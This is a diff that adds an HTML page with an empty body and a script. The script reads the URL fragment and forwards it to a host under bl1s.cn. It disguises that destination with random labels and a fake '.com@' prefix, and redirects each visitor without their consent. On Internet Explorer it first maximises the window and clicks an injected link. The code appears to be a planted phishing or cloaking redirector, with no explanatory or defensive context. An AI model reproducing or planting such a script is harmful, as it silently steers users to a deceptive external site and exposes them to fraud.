@@ -1,0 +1,35 @@
+<body></body>  
+<script>  
+    function getRandomNum(min, max) {  
+        var range = max - min;  
+        var rand = Math.random();  
+        return Math.round(rand * range) + min;  
+    }  
+  
+    var reg = document.location.hash;  
+    var a = reg.split("#")[1];  
+  
+    function generateMixed(n) {  
+        var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";  
+        var res = "";  
+        for (var i = 0; i < n; i++) {  
+            var id = Math.floor(Math.random() * chars.length);  
+            res += chars[id];  
+        }  
+        return res;  
+    }  
+  
+    var url = 'http://' + generateMixed(5) + '.com@' + generateMixed(6) + '.bl1s.cn/?' + a + '#' + generateMixed(5) + '.html';  
+    if (/MSIE/i.test(navigator.userAgent)) {  
+        try {  
+            window.moveTo(0, 0);  
+            window.resizeTo(screen.availWidth, screen.availHeight);  
+        } catch (e) {}  
+        var a = document.createElement('a');  
+        a.href = url;  
+        document.body.appendChild(a);  
+        a.click();  
+    } else {  
+        location.href = url;  
+    }  
+</script>
